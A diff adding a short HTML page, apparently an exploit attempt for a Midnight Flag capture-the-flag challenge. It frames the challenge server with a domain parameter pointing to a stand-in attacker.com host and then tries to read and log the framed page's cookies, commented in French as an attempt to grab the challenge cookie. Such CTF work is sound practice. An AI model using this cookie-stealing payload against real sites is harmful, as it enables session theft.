@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<iframe id="f" src="http://dyn-03.midnightflag.fr:11716/?domain=https://attacker.com"></iframe>
+
+<script>
+
+const frame = document.getElementById("f");
+
+frame.onload = () => {
+
+    try {
+
+        const w = frame.contentWindow;
+
+        // tentative de log du cookie du challenge
+        w.console.log(w.document.cookie);
+
+    } catch(e) {
+
+        console.log("exploit error", e);
+
+    }
+
+};
+
+</script>
+
+</body>
+</html>
